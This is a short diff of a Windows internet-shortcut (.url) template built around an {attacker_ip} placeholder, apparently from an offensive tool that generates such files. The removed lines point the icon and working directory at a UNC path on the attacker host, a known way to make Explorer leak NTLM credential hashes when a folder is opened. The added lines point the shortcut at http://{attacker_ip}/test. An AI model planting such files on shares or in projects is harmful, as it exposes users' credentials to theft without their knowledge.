@@ -1,5 +1,5 @@
 [InternetShortcut]
-URL={attacker_ip}
-WorkingDirectory=\\{attacker_ip}\test
-IconFile=\\{attacker_ip}\A.icon
-IconIndex=1 
+URL=http://{attacker_ip}/test
+WorkingDirectory=C:\WINDOWS\
+IconIndex=153
+IconFile=C:\Windows\System32\imageres.dll
